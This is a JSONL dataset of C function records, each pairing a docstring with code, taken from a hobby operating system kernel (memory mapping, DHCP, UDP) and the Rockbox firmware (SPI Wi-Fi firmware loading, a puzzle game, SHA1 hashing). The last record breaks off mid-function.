{"docstring": "//! initialize hardware devices\n", "func_signal": "int hal_initialize()", "code": "{\n\n\t//! disable hardware interrupts\n\tdisable();\n\n\t//! initialize motherboard controllers and system timer\n\ti86_cpu_initialize();\n\ti86_pic_initialize(0x20, 0x28);\n\ti86_pit_initialize();\n\ti86_pit_start_counter(100, I86_PIT_OCW_COUNTER_0, I86_PIT_OCW_MODE_SQUAREWAVEGEN);\n\n\t//! enable interrupts\n\tenable();\n\n\treturn 0;\n}", "path": "examples\\mikeos\\kernel\\Hal\\Hal.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "// Check ip header valid, adjust skb *data\n", "func_signal": "int ip4_rcv(struct sk_buff *skb)", "code": "{\n\tif (htons(skb->mac.eh->type) != ETH_P_IP)\n\t\treturn -EPROTO;\n\n\tstruct ip4_packet *iph = (struct ip4_packet *)skb->data;\n\tskb->nh.iph = iph;\n\tskb_pull(skb, sizeof(struct ip4_packet));\n\n\treturn 0;\n}", "path": "src\\kernel\\net\\ip.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "//! notifies hal interrupt is done\n", "func_signal": "void interruptdone(unsigned int intno)", "code": "{\n\n\t//! insure its a valid hardware irq\n\tif (intno > 16)\n\t\treturn;\n\n\t//! test if we need to send end-of-interrupt to second pic\n\tif (intno >= 8)\n\t\ti86_pic_send_command(I86_PIC_OCW2_MASK_EOI, 1);\n\n\t//! always send end-of-interrupt to primary pic\n\ti86_pic_send_command(I86_PIC_OCW2_MASK_EOI, 0);\n}", "path": "examples\\mikeos\\kernel\\Hal\\Hal.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "//! returns current interrupt vector\n", "func_signal": "void(far *getvect(int intno))()", "code": "{\n\n\t//! get the descriptor from the idt\n\tidt_descriptor *desc = i86_get_ir(intno);\n\tif (!desc)\n\t\treturn 0;\n\n\t//! get address of interrupt handler\n\tuint32_t addr = desc->baseLo | (desc->baseHi << 16);\n\n\t//! return interrupt handler\n\tI86_IRQ_HANDLER irq = (I86_IRQ_HANDLER)addr;\n\treturn irq;\n}", "path": "examples\\mikeos\\kernel\\Hal\\Hal.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "// TODO: MQ 2020-01-25 Add support for release block when there is no reference to frame block\n", "func_signal": "struct vm_area_struct *get_unmapped_area(uint32_t addr, uint32_t len)", "code": "{\n\tstruct mm_struct *mm = current_process->mm;\n\tstruct vm_area_struct *vma = kcalloc(1, sizeof(struct vm_area_struct));\n\tvma->vm_mm = mm;\n\n\tif (!addr || addr < mm->end_brk)\n\t\taddr = max(mm->free_area_cache, mm->end_brk);\n\tassert(addr == PAGE_ALIGN(addr));\n\tlen = PAGE_ALIGN(len);\n\n\tuint32_t found_addr = addr;\n\tif (list_empty(&mm->mmap))\n\t\tlist_add(&vma->vm_sibling, &mm->mmap);\n\telse\n\t{\n\t\tstruct vm_area_struct *iter = NULL;\n\t\tlist_for_each_entry(iter, &mm->mmap, vm_sibling)\n\t\t{\n\t\t\tstruct vm_area_struct *next = list_next_entry(iter, vm_sibling);\n\t\t\tbool is_last_entry = list_is_last(&iter->vm_sibling, &mm->mmap);\n\n\t\t\tif (addr + len <= iter->vm_start)\n\t\t\t{\n\t\t\t\tlist_add(&iter->vm_sibling, &mm->mmap);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (addr >= iter->vm_end &&\n\t\t\t\t\t (is_last_entry ||\n\t\t\t\t\t  (!is_last_entry && addr + len <= next->vm_start)))\n\t\t\t{\n\t\t\t\tlist_add(&vma->vm_sibling, &iter->vm_sibling);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (!is_last_entry &&\n\t\t\t\t\t (iter->vm_end <= addr && addr < next->vm_start) && next->vm_start - iter->vm_end >= len)\n\t\t\t{\n\t\t\t\tlist_add(&vma->vm_sibling, &iter->vm_sibling);\n\t\t\t\tfound_addr = next->vm_start - len;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (found_addr)\n\t{\n\t\tvma->vm_start = found_addr;\n\t\tvma->vm_end = found_addr + len;\n\t\tmm->free_area_cache = vma->vm_end;\n\t}\n\n\treturn vma;\n}", "path": "src\\kernel\\memory\\mmap.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "// FIXME: MQ 2019-01-16 Currently, we assume that start_brk is not changed\n", "func_signal": "uint32_t do_brk(uint32_t addr, size_t len)", "code": "{\n\tstruct mm_struct *mm = current_process->mm;\n\tstruct vm_area_struct *vma = find_vma(mm, addr);\n\tuint32_t new_brk = PAGE_ALIGN(addr + len);\n\tmm->brk = new_brk;\n\n\tif (!vma || vma->vm_end >= new_brk)\n\t\treturn 0;\n\n\tstruct vm_area_struct *new_vma = kcalloc(1, sizeof(struct vm_area_struct));\n\tmemcpy(new_vma, vma, sizeof(struct vm_area_struct));\n\tif (new_brk > mm->brk)\n\t\texpand_area(new_vma, new_brk, true);\n\telse\n\t\tnew_vma->vm_end = new_brk;\n\n\tif (vma->vm_file)\n\t\tvma->vm_file->f_op->mmap(vma->vm_file, new_vma);\n\telse\n\t{\n\t\tif (new_vma->vm_end > vma->vm_end)\n\t\t{\n\t\t\tuint32_t nframes = (new_vma->vm_end - vma->vm_end) / PMM_FRAME_SIZE;\n\t\t\tuint32_t paddr = (uint32_t)pmm_alloc_blocks(nframes);\n\t\t\tfor (uint32_t vaddr = vma->vm_end; vaddr < new_vma->vm_end; vaddr += PMM_FRAME_SIZE, paddr += PMM_FRAME_SIZE)\n\t\t\t\tvmm_map_address(current_process->pdir, vaddr, paddr, I86_PTE_PRESENT | I86_PTE_WRITABLE | I86_PTE_USER);\n\t\t}\n\t\telse if (new_vma->vm_end < vma->vm_end)\n\t\t\tfor (uint32_t addr = new_vma->vm_end; addr < vma->vm_end; addr += PMM_FRAME_SIZE)\n\t\t\t\tvmm_unmap_address(current_process->pdir, addr);\n\t}\n\tmemcpy(vma, new_vma, sizeof(struct vm_area_struct));\n\n\treturn 0;\n}", "path": "src\\kernel\\memory\\mmap.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "// Not libc standard\n", "func_signal": "char *skip_spaces(const char *str)", "code": "{\n\twhile (isspace(*str))\n\t\t++str;\n\treturn (char *)str;\n}", "path": "src\\kernel\\utils\\string.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "/**\n* Map physical address to virtual\n* \\param dir Page directory\n* \\param virt Virtual address\n* \\param phys Physical address\n* \\param flags Page flags\n*/\n", "func_signal": "void vmmngr_mapPhysicalAddress(pdirectory *dir, uint32_t virt, uint32_t phys, uint32_t flags)", "code": "{\n\n        pd_entry *pagedir = dir->m_entries;\n        if (pagedir[virt >> 22] == 0)\n                vmmngr_createPageTable(dir, virt, flags);\n        ((uint32_t *)(pagedir[virt >> 22] & ~0xfff))[virt << 10 >> 10 >> 12] = phys | flags;\n}", "path": "examples\\mikeos\\kernel\\mmngr_virtual.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "// NOTE: Using long long to prevent sign is changed due to hex memory address beyonds long's scope\n", "func_signal": "void itoa_s(long long i, unsigned base, char *buf)", "code": "{\n\tif (base > 16)\n\t\treturn;\n\tif (i < 0)\n\t{\n\t\t*buf++ = '-';\n\t\ti *= -1;\n\t}\n\titoa(i, base, buf);\n}", "path": "src\\kernel\\utils\\string.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "// NOTE: MQ 2020-05-21 We don't need to perform routing, only supporting one router\n", "func_signal": "int udp_connect(struct socket *sock, struct sockaddr *vaddr, int sockaddr_len)", "code": "{\n\tstruct inet_sock *isk = inet_sk(sock->sk);\n\tmemcpy(&isk->dsin, vaddr, sockaddr_len);\n\n\tsock->state = SS_CONNECTED;\n\treturn 0;\n}", "path": "src\\kernel\\net\\udp.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "/**\n* Allocates new page table\n* \\param dir Page directory\n* \\param virt Virtual address\n* \\param flags Page flags\n* \\ret Status code\n*/\n", "func_signal": "int vmmngr_createPageTable(pdirectory *dir, uint32_t virt, uint32_t flags)", "code": "{\n\n        pd_entry *pagedir = dir->m_entries;\n        if (pagedir[virt >> 22] == 0)\n        {\n                void *block = pmmngr_alloc_block();\n                if (!block)\n                        return 0; /* Should call debugger */\n                pagedir[virt >> 22] = ((uint32_t)block) | flags;\n                memset((uint32_t *)pagedir[virt >> 22], 0, 4096);\n\n                /* map page table into directory */\n                vmmngr_mapPhysicalAddress(dir, (uint32_t)block, (uint32_t)block, flags);\n        }\n        return 1; /* success */\n}", "path": "examples\\mikeos\\kernel\\mmngr_virtual.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "// 1. Create af packet socket with IP/UDP protocal\n// 2. Create helper to construct dhcp packet\n// 3. Send dhcp discovery packet\n// 4. In recvmsg -> dhcp offer -> valid IP/UDP headers\n// 5. Get server_ip, yiaddr and xip -> send dhcp request\n// 6. In recvmsg -> dhcp ack -> valid IP/UDP headers\n// 7. Get router ip, router mac address and assign them to net dev\n", "func_signal": "int dhcp_setup()", "code": "{\n\tlog(\"DHCP: Initializing\");\n\n\tint32_t sockfd = sys_socket(PF_PACKET, SOCK_RAW, ETH_P_ALL);\n\tstruct socket *sock = sockfd_lookup(sockfd);\n\tstruct net_device *dev = sock->sk->dev;\n\tstruct sk_buff *skb;\n\tstruct ethernet_packet *received_eh = kcalloc(1, MAX_PACKET_LEN);\n\tuint8_t *options;\n\tuint32_t router_ip, subnet_mask, lease_time, dhcp_server_ip, local_ip, dns_server_ip;\n\tuint16_t mtu;\n\tuint32_t dhcp_xip = rand();\n\tint32_t ret;\n\n\tif (dev->state & NETDEV_STATE_OFF)\n\t\treturn -EBUSY;\n\n\t// DHCP Discovery\n\tlog(\"DHCP: Discovery\");\n\tuint32_t dhcp_discovery_option_len;\n\tdhcp_create_discovery_options(&options, &dhcp_discovery_option_len);\n\tskb = dhcp_create_skbuff(DHCP_REQUEST, 0, 0xffffffff, dhcp_xip, 0, options, dhcp_discovery_option_len);\n\tkfree(options);\n\tsock->ops->sendmsg(sock, skb->mac.eh, DHCP_SIZE(dhcp_discovery_option_len));\n\n\t// DHCP Offer\n\tstruct dhcp_packet *dhcp_offer;\n\tuint8_t attempt_discovery = 0;\n\twhile (true)\n\t{\n\t\tattempt_discovery++;\n\t\tmemset(received_eh, 0, MAX_PACKET_LEN);\n\t\tsock->ops->recvmsg(sock, received_eh, MAX_PACKET_LEN);\n\n\t\tret = dhcp_parse_from_eh_packet(received_eh, &dhcp_offer);\n\t\tif (ret >= 0)\n\t\t{\n\t\t\tret = dhcp_offer_parse_options(dhcp_offer->options, &dhcp_server_ip);\n\t\t\tif (ret >= 0)\n\t\t\t\tbreak;\n\t\t}\n\n\t\t// NOTE: MQ 2020-06-06\n\t\t// DHCP Server might not accept dhcp discovery in the first few times (why?)\n\t\t// after discovering, we do it again in every 5th received packet until we get dhcp offer\n\t\t// we will use the separated process (via command line) with share memory and pthread\n\t\tif (attempt_discovery % 5 == 0)\n\t\t{\n\t\t\tlog(\"DHCP: Discovery\");\n\t\t\tuint32_t dhcp_discovery_option_len;\n\t\t\tdhcp_create_discovery_options(&options, &dhcp_discovery_option_len);\n\t\t\tskb = dhcp_create_skbuff(DHCP_REQUEST, 0, 0xffffffff, dhcp_xip, 0, options, dhcp_discovery_option_len);\n\t\t\tkfree(options);\n\t\t\tsock->ops->sendmsg(sock, skb->mac.eh, DHCP_SIZE(dhcp_discovery_option_len));\n\t\t}\n\t}\n\tlog(\"DHCP: Offer\");\n\n\t// DHCP Request\n\tlog(\"DHCP: Request\");\n\tuint32_t dhcp_request_option_len;\n\tdhcp_create_request_options(&options, &dhcp_request_option_len, ntohl(dhcp_offer->yiaddr), ntohl(dhcp_offer->siaddr));\n\tskb = dhcp_create_skbuff(DHCP_REQUEST, 0, 0xffffffff, dhcp_xip, 0, options, dhcp_request_option_len);\n\tsock->ops->sendmsg(sock, skb->mac.eh, DHCP_SIZE(dhcp_request_option_len));\n\tkfree(options);\n\n\t// DHCP Ack\n\tstruct dhcp_packet *dhcp_ack;\n\twhile (true)\n\t{\n\t\tmemset(received_eh, 0, MAX_PACKET_LEN);\n\t\tsock->ops->recvmsg(sock, received_eh, MAX_PACKET_LEN);\n\n\t\tret = dhcp_parse_from_eh_packet(received_eh, &dhcp_ack);\n\t\tif (ret < 0)\n\t\t\tcontinue;\n\t\tret = dhcp_ack_parse_options(dhcp_ack->options, &subnet_mask, &router_ip, &lease_time, &dhcp_server_ip, &dns_server_ip, &mtu);\n\t\tif (ret >= 0)\n\t\t\tbreak;\n\t}\n\tlog(\"DHCP: Ack\");\n\tsock->ops->shutdown(sock);\n\tlocal_ip = ntohl(dhcp_ack->yiaddr);\n\n\t// ARP Announcement\n\tlog(\"DHCP: ARP Announcement\");\n\tarp_send(dev->dev_addr, local_ip, dev->zero_addr, local_ip, ARP_REQUEST);\n\n\tdev->local_ip = local_ip;\n\tdev->subnet_mask = subnet_mask;\n\tdev->router_ip = router_ip;\n\tdev->lease_time = lease_time;\n\tdev->dhcp_server_ip = dhcp_server_ip;\n\tdev->dns_server_ip = dns_server_ip;\n\tdev->mtu = mtu;\n\n\t// ARP Probe\n\tlog(\"DHCP: ARP for router\");\n\tuint8_t *router_mac = lookup_mac_addr_from_ip(router_ip);\n\n\tmemcpy(dev->router_addr, router_mac, 6);\n\tdev->state = NETDEV_STATE_CONNECTED;\n\n\tkfree(received_eh);\n\tlog(\"DHCP: Done\");\n\n\treturn ret;\n}", "path": "src\\kernel\\net\\dhcp.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "// Not libc standard\n", "func_signal": "char *skip_spaces(const char *str)", "code": "{\n\twhile (isspace(*str))\n\t\t++str;\n\treturn (char *)str;\n}", "path": "src\\libraries\\libc\\string.c", "repo_name": "MQuy/mos", "stars": 340, "license": "mit", "language": "c", "size": 2436}
{"docstring": "/*\n * Returns the length of the next packet the firmware expects us to send.\n * Sets crc_err if the previous transfer had a CRC error.\n */\n", "func_signal": "static int if_spi_prog_main_firmware_check_len(struct if_spi_card *card,\n                                               int *crc_err)", "code": "{\n    uint16_t len;\n    int err = 0;\n\n    /*\n     * wait until the host interrupt status register indicates\n     * that we are ready to download\n     */\n    err = spu_wait_for_u16(card, IF_SPI_HOST_INT_STATUS_REG,\n                           IF_SPI_HIST_CMD_DOWNLOAD_RDY,\n                           IF_SPI_HIST_CMD_DOWNLOAD_RDY);\n    if (err)\n    {\n        logf(\"timed out waiting for host_int_status\");\n        return err;\n    }\n\n    /* Ask the device how many bytes of firmware it wants. */\n    err = spu_read_u16(card, IF_SPI_SCRATCH_1_REG, &len);\n    if (err)\n        return err;\n\n    if (len > IF_SPI_CMD_BUF_SIZE)\n    {\n        logf(\"firmware load device requested a larger transfer than we are prepared to handle (len = %d)\",\n             len);\n        return -EIO;\n    }\n    if (len & 0x1) {\n        logf(\"%s: crc error\", __func__);\n        len &= ~0x1;\n        *crc_err = 1;\n    } else\n        *crc_err = 0;\n\n    return len;\n}", "path": "firmware\\drivers\\libertas\\if_spi.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/*\n * Compute which squares are reachable from the centre square, as a\n * quick visual aid to determining how close the game is to\n * completion. This is also a simple way to tell if the game _is_\n * completed - just call this function and see whether every square\n * is marked active.\n *\n * squares in the moving_row and moving_col are always inactive - this\n * is so that \"current\" doesn't appear to jump across moving lines.\n */\n", "func_signal": "static unsigned char *compute_active(const game_state *state,\n                                     int moving_row, int moving_col)", "code": "{\n    unsigned char *active;\n    tree234 *todo;\n    struct xyd *xyd;\n\n    active = snewn(state->width * state->height, unsigned char);\n    memset(active, 0, state->width * state->height);\n\n    /*\n     * We only store (x,y) pairs in todo, but it's easier to reuse\n     * xyd_cmp and just store direction 0 every time.\n     */\n    todo = newtree234(xyd_cmp);\n    index(state, active, state->cx, state->cy) = ACTIVE;\n    add234(todo, new_xyd(state->cx, state->cy, 0));\n\n    while ( (xyd = delpos234(todo, 0)) != NULL) {\n\tint x1, y1, d1, x2, y2, d2;\n\n\tx1 = xyd->x;\n\ty1 = xyd->y;\n\tsfree(xyd);\n\n\tfor (d1 = 1; d1 < 0x10; d1 <<= 1) {\n\t    OFFSET(x2, y2, x1, y1, d1, state);\n\t    d2 = F(d1);\n\n\t    /*\n\t     * If the next tile in this direction is connected to\n\t     * us, and there isn't a barrier in the way, and it\n\t     * isn't already marked active, then mark it active and\n\t     * add it to the to-examine list.\n\t     */\n\t    if ((x2 != moving_col && y2 != moving_row) &&\n                (tile(state, x1, y1) & d1) &&\n\t\t(tile(state, x2, y2) & d2) &&\n\t\t!(barrier(state, x1, y1) & d1) &&\n\t\t!index(state, active, x2, y2)) {\n\t\tindex(state, active, x2, y2) = ACTIVE;\n\t\tadd234(todo, new_xyd(x2, y2, 0));\n\t    }\n\t}\n    }\n    /* Now we expect the todo list to have shrunk to zero size. */\n    assert(count234(todo) == 0);\n    freetree234(todo);\n\n    return active;\n}", "path": "apps\\plugins\\puzzles\\src\\netslide.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* Compute SHA1 message digest for bytes read from STREAM.  The\n   resulting message digest number will be written into the 16 bytes\n   beginning at RESBLOCK.  */\n", "func_signal": "int\nsha1_stream (FILE *stream, void *resblock)", "code": "{\n  struct sha1_ctx ctx;\n  char buffer[BLOCKSIZE + 72];\n  size_t sum;\n\n  /* Initialize the computation context.  */\n  sha1_init_ctx (&ctx);\n\n  /* Iterate over full file contents.  */\n  while (1)\n    {\n      /* We read the file in blocks of BLOCKSIZE bytes.  One call of the\n\t computation function processes the whole buffer so that with the\n\t next round of the loop another block can be read.  */\n      size_t n;\n      sum = 0;\n\n      /* Read block.  Take care for partial reads.  */\n      while (1)\n\t{\n\t  n = fread (buffer + sum, 1, BLOCKSIZE - sum, stream);\n\n\t  sum += n;\n\n\t  if (sum == BLOCKSIZE)\n\t    break;\n\n\t  if (n == 0)\n\t    {\n\t      /* Check for the error flag IFF N == 0, so that we don't\n\t\t exit the loop after a partial read due to e.g., EAGAIN\n\t\t or EWOULDBLOCK.  */\n\t      if (ferror (stream))\n\t\treturn 1;\n\t      goto process_partial_block;\n\t    }\n\n\t  /* We've read at least one byte, so ignore errors.  But always\n\t     check for EOF, since feof may be true even though N > 0.\n\t     Otherwise, we could end up calling fread after EOF.  */\n\t  if (feof (stream))\n\t    goto process_partial_block;\n\t}\n\n      /* Process buffer with BLOCKSIZE bytes.  Note that\n\t\t\tBLOCKSIZE % 64 == 0\n       */\n      sha1_process_block (buffer, BLOCKSIZE, &ctx);\n    }\n\n process_partial_block:;\n\n  /* Process any remaining bytes.  */\n  if (sum > 0)\n    sha1_process_bytes (buffer, sum, &ctx);\n\n  /* Construct result in desired memory.  */\n  sha1_finish_ctx (&ctx, resblock);\n  return 0;\n}", "path": "tools\\hmac-sha1.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* ----------------------------------------------------------------------\n * Routines for drawing the game position on the screen.\n */\n", "func_signal": "static game_drawstate *game_new_drawstate(drawing *dr, const game_state *state)", "code": "{\n    game_drawstate *ds = snew(game_drawstate);\n\n    ds->started = false;\n    ds->width = state->width;\n    ds->height = state->height;\n    ds->visible = snewn(state->width * state->height, unsigned char);\n    ds->tilesize = 0;                  /* not decided yet */\n    memset(ds->visible, 0xFF, state->width * state->height);\n    ds->cur_x = ds->cur_y = -1;\n\n    return ds;\n}", "path": "apps\\plugins\\puzzles\\src\\netslide.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/*\n * Firmware Loading\n */\n", "func_signal": "static int if_spi_prog_helper_firmware(struct if_spi_card *card, int fd)", "code": "{\n    int err = 0;\n    int bytes_read;\n    uint8_t *temp = card->cmd_buffer;\n\n    err = spu_set_interrupt_mode(card, 1, 0);\n    if (err)\n        goto out;\n\n    /* Load helper firmware image */\n    while ((bytes_read = read(fd, temp, HELPER_FW_LOAD_CHUNK_SZ)) > 0)\n    {\n        /*\n         * Scratch pad 1 should contain the number of bytes we\n         * want to download to the firmware\n         */\n        err = spu_write_u16(card, IF_SPI_SCRATCH_1_REG,\n                            HELPER_FW_LOAD_CHUNK_SZ);\n        if (err)\n            goto out;\n\n        err = spu_wait_for_u16(card, IF_SPI_HOST_INT_STATUS_REG,\n                               IF_SPI_HIST_CMD_DOWNLOAD_RDY,\n                               IF_SPI_HIST_CMD_DOWNLOAD_RDY);\n        if (err)\n            goto out;\n\n        /*\n         * Feed the data into the command read/write port reg\n         * in chunks of 64 bytes\n         */\n        memset(temp + bytes_read, 0, HELPER_FW_LOAD_CHUNK_SZ - bytes_read);\n        mdelay(10);\n        err = spu_write(card, IF_SPI_CMD_RDWRPORT_REG,\n                        temp, HELPER_FW_LOAD_CHUNK_SZ);\n        if (err)\n            goto out;\n\n        /* Interrupt the boot code */\n        err = spu_write_u16(card, IF_SPI_HOST_INT_STATUS_REG, 0);\n        if (err)\n            goto out;\n        err = spu_write_u16(card, IF_SPI_CARD_INT_CAUSE_REG,\n                            IF_SPI_CIC_CMD_DOWNLOAD_OVER);\n        if (err)\n            goto out;\n    }\n\n    /*\n     * Once the helper / single stage firmware download is complete,\n     * write 0 to scratch pad 1 and interrupt the\n     * bootloader. This completes the helper download.\n     */\n    err = spu_write_u16(card, IF_SPI_SCRATCH_1_REG, FIRMWARE_DNLD_OK);\n    if (err)\n        goto out;\n    err = spu_write_u16(card, IF_SPI_HOST_INT_STATUS_REG, 0);\n    if (err)\n        goto out;\n    err = spu_write_u16(card, IF_SPI_CARD_INT_CAUSE_REG,\n                        IF_SPI_CIC_CMD_DOWNLOAD_OVER);\nout:\n    if (err)\n        logf(\"failed to load helper firmware (err=%d)\", err);\n\n    return err;\n}", "path": "firmware\\drivers\\libertas\\if_spi.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/*\n * Read 32 bits from an SPI register.\n * The low 16 bits are read first.\n */\n", "func_signal": "static int spu_read_u32(struct if_spi_card *card, uint16_t reg, uint32_t *val)", "code": "{\n    uint8_t buf[4];\n    int err;\n\n    err = spu_read(card, reg, buf, sizeof(buf));\n    if (!err)\n        *val = buf[0] | (buf[1] << 8) | (buf[2] << 16) | (buf[3] << 24);\n    return err;\n}", "path": "firmware\\drivers\\libertas\\if_spi.c", "repo_name": "Rockbox/rockbox", "stars": 395, "license": "None", "language": "c", "size": 222360}
{"docstring": "/* ----------------------------------------------------------------------\n * Randomly select a new game description.\n */\n", "func_signal": "static char *new_game_desc(const game_params *params, random_state *rs,\n\t\t\t   char **aux, bool interactive)", "code": "{\n    tree234 *possibilities, *barriertree;\n    int w, h, x, y, cx, cy, nbarriers;\n    unsigned char *tiles, *barriers;\n    char *desc, *p;\n\n    w = params->width;\n    h = params->height;\n\n    tiles = snewn(w * h, unsigned char);\n    memset(tiles, 0, w * h);\n    barriers = snewn(w * h, unsigned char);\n    memset(barriers, 0, w * h);\n\n    cx = w / 2;\n    cy = h / 2;\n\n    /*\n     * Construct the unshuffled grid.\n     * \n     * To do this, we simply start at the centre point, repeatedly\n     * choose a random possibility out of the available ways to\n     * extend a used square into an unused one, and do it. After\n     * extending the third line out of a square, we remove the\n     * fourth from the possibilities list to avoid any full-cross\n     * squares (which would make the game too easy because they\n     * only have one orientation).\n     * \n     * The slightly worrying thing is the avoidance of full-cross\n     * squares. Can this cause our unsophisticated construction\n     * algorithm to paint itself into a corner, by getting into a\n     * situation where there are some unreached squares and the\n     * only way to reach any of them is to extend a T-piece into a\n     * full cross?\n     * \n     * Answer: no it can't, and here's a proof.\n     * \n     * Any contiguous group of such unreachable squares must be\n     * surrounded on _all_ sides by T-pieces pointing away from the\n     * group. (If not, then there is a square which can be extended\n     * into one of the `unreachable' ones, and so it wasn't\n     * unreachable after all.) In particular, this implies that\n     * each contiguous group of unreachable squares must be\n     * rectangular in shape (any deviation from that yields a\n     * non-T-piece next to an `unreachable' square).\n     * \n     * So we have a rectangle of unreachable squares, with T-pieces\n     * forming a solid border around the rectangle. The corners of\n     * that border must be connected (since every tile connects all\n     * the lines arriving in it), and therefore the border must\n     * form a closed loop around the rectangle.\n     * \n     * But this can't have happened in the first place, since we\n     * _know_ we've avoided creating closed loops! Hence, no such\n     * situation can ever arise, and the naive grid construction\n     * algorithm will guaranteeably result in a complete grid\n     * containing no unreached squares, no full crosses _and_ no\n     * closed loops. []\n     */\n    possibilities = newtree234(xyd_cmp);\n\n    if (cx+1 < w)\n\tadd234(possibilities, new_xyd(cx, cy, R));\n    if (cy-1 >= 0)\n\tadd234(possibilities, new_xyd(cx, cy, U));\n    if (cx-1 >= 0)\n\tadd234(possibilities, new_xyd(cx, cy, L));\n    if (cy+1 < h)\n\tadd234(possibilities, new_xyd(cx, cy, D));\n\n    while (count234(possibilities) > 0) {\n\tint i;\n\tstruct xyd *xyd;\n\tint x1, y1, d1, x2, y2, d2, d;\n\n\t/*\n\t * Extract a randomly chosen possibility from the list.\n\t */\n\ti = random_upto(rs, count234(possibilities));\n\txyd = delpos234(possibilities, i);\n\tx1 = xyd->x;\n\ty1 = xyd->y;\n\td1 = xyd->direction;\n\tsfree(xyd);\n\n\tOFFSET(x2, y2, x1, y1, d1, params);\n\td2 = F(d1);\n#ifdef GENERATION_DIAGNOSTICS\n\tprintf(\"picked (%d,%d,%c) <-> (%d,%d,%c)\\n\",\n\t       x1, y1, \"0RU3L567D9abcdef\"[d1], x2, y2, \"0RU3L567D9abcdef\"[d2]);\n#endif\n\n\t/*\n\t * Make the connection. (We should be moving to an as yet\n\t * unused tile.)\n\t */\n\tindex(params, tiles, x1, y1) |= d1;\n\tassert(index(params, tiles, x2, y2) == 0);\n\tindex(params, tiles, x2, y2) |= d2;\n\n\t/*\n\t * If we have created a T-piece, remove its last\n\t * possibility.\n\t */\n\tif (COUNT(index(params, tiles, x1, y1)) == 3) {\n\t    struct xyd xyd1, *xydp;\n\n\t    xyd1.x = x1;\n\t    xyd1.y = y1;\n\t    xyd1.direction = 0x0F ^ index(params, tiles, x1, y1);\n\n\t    xydp = find234(possibilities, &xyd1, NULL);\n\n\t    if (xydp) {\n#ifdef GENERATION_DIAGNOSTICS\n\t\tprintf(\"T-piece; removing (%d,%d,%c)\\n\",\n\t\t       xydp->x, xydp->y, \"0RU3L567D9abcdef\"[xydp->direction]);\n#endif\n\t\tdel234(possibilities, xydp);\n\t\tsfree(xydp);\n\t    }\n\t}\n\n\t/*\n\t * Remove all other possibilities that were pointing at the\n\t * tile we've just moved into.\n\t */\n\tfor (d = 1; d < 0x10; d <<= 1) {\n\t    int x3, y3, d3;\n\t    struct xyd xyd1, *xydp;\n\n\t    OFFSET(x3, y3, x2, y2, d, params);\n\t    d3 = F(d);\n\n\t    xyd1.x = x3;\n\t    xyd1.y = y3;\n\t    xyd1.direction = d3;\n\n\t    xydp = find234(possibilities, &xyd1, NULL);\n\n\t    if (xydp) {\n#ifdef GENERATION_DIAGNOSTICS\n\t\tprintf(\"Loop avoidance; removing (%d,%d,%c)\\n\",\n\t\t       xydp->x, xydp->y, \"0RU3L567D9abcdef\"[xydp->direction]);\n#endif\n\t\tdel234(possibilities, xydp);\n\t\tsfree(xydp);\n\t    }\n\t}\n\n\t/*\n\t * Add new possibilities to the list for moving _out_ of\n\t * the tile we have just moved into.\n\t */\n\tfor (d = 1; d < 0x10; d <<= 1) {\n\t    int x3, y3;\n\n\t    if (d == d2)\n\t\tcontinue;\t       /* we've got this one already */\n\n\t    if (!params->wrapping) {\n\t\tif (d == U && y2 == 0)\n\t\t    continue;\n\t\tif (d == D && y2 == h-1)\n\t\t    continue;\n\t\tif (d == L && x2 == 0)\n\t\t    continue;\n\t\tif (d == R && x2 == w-1)\n\t\t    continue;\n\t    }\n\n\t    OFFSET(x3, y3, x2, y2, d, params);\n\n\t    if (index(params, tiles, x3, y3))\n\t\tcontinue;\t       /* this would create a loop */\n\n#ifdef GENERATION_DIAGNOSTICS\n\t    printf(\"New frontier; adding (%d,%d,%c)\\n\",\n\t\t   x2, y2, \"0RU3L567D9abcdef\"[d]);\n#endif\n\t    add234(possibilities, new_xyd(x2, y2, d));\n\t}\n    }\n    /* Having done that, we should have no possibilities remaining. */\n    assert(count234(possibilities) == 0);\n    freetree234(possibilities);\n\n    /*\n     * Now compute a list of the possible barrier locations.\n     */\n    barriertree = newtree234(xyd_cmp);\n    for (y = 0; y < h; y++) {\n\tfor (x = 0; x < w; x++) {\n\n\t    if (!(index(params, tiles, x, y) & R) &&\n                (params->wrapping || x < w-1))\n\t\tadd234(barriertree, new_xyd(x, y, R));\n\t    if (!(index(params, tiles, x, y) & D) &&\n                (params->wrapping || y < h-1))\n\t\tadd234(barriertree, new_xyd(x, y, D));\n\t}\n    }\n\n    /*\n     * Save the unshuffled grid in aux.\n     */\n    {\n\tchar *solution;\n        int i;\n\n        /*\n         * String format is exactly the same as a solve move, so we\n         * can just dupstr this in solve_game().\n         */\n\n\tsolution = snewn(w * h + 2, char);\n        solution[0] = 'S';\n        for (i = 0; i < w * h; i++)\n            solution[i+1] = 